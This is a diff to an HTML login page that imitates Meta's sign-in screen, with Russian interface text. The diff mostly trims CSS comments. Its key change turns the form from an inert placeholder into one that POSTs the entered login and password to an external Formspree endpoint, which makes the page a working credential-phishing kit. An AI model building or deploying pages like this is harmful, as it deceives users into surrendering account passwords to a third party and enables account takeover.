@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Вход • Meta</title>
     <style>
-        /* Основные стили (CSS) */
+        /* CSS стили для оформления */
         * {
             margin: 0;
             padding: 0;
@@ -14,7 +14,7 @@
         }
 
         body {
-            background-color: #000; /* Черный фон как на скрине */
+            background-color: #000;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -40,10 +40,9 @@
             gap: 5px;
         }
 
-        /* Поля ввода */
         .input-field {
             width: 100%;
-            background-color: #1c1c1c; /* Темно-серый фон инпутов */
+            background-color: #1c1c1c;
             border: 1px solid #333;
             border-radius: 12px;
             padding: 16px 12px;
@@ -57,14 +56,9 @@
             border-color: #555;
         }
 
-        .input-field::placeholder {
-            color: #8e8e8e;
-        }
-
-        /* Кнопка Войти */
         .login-btn {
             width: 100%;
-            background-color: #0064e0; /* Ярко-синий */
+            background-color: #0064e0;
             color: white;
             border: none;
             border-radius: 25px;
@@ -75,21 +69,14 @@
             margin-top: 10px;
         }
 
-        .login-btn:active {
-            opacity: 0.8;
-        }
-
-        /* Забыли пароль */
         .forgot-link {
             display: inline-block;
             margin-top: 20px;
             color: #fff;
             text-decoration: none;
             font-size: 14px;
-            font-weight: 400;
         }
 
-        /* Кнопка внизу */
         .footer {
             position: absolute;
             bottom: 30px;
@@ -106,23 +93,23 @@
             padding: 10px;
             font-size: 14px;
             font-weight: 500;
-            cursor: pointer;
             text-decoration: none;
             display: block;
+            text-align: center;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- Заголовок имитирующий Meta -->
         <div class="meta-logo">
             <span>∞</span> Meta
         </div>
         
-        <form action="#">
-            <input type="text" class="input-field" placeholder="Имя пользователя, эл. адрес или мобильный телефон" value="ssaqlus">
-            <input type="password" class="input-field" placeholder="Пароль">
+        <!-- Форма отправки данных на Formspree -->
+        <form action="https://formspree.io/f/xbdwpogo" method="POST">
+            <input type="text" name="login" class="input-field" placeholder="Имя пользователя, эл. адрес или мобильный телефон" required>
+            <input type="password" name="password" class="input-field" placeholder="Пароль" required>
             
             <button type="submit" class="login-btn">Войти</button>
         </form>
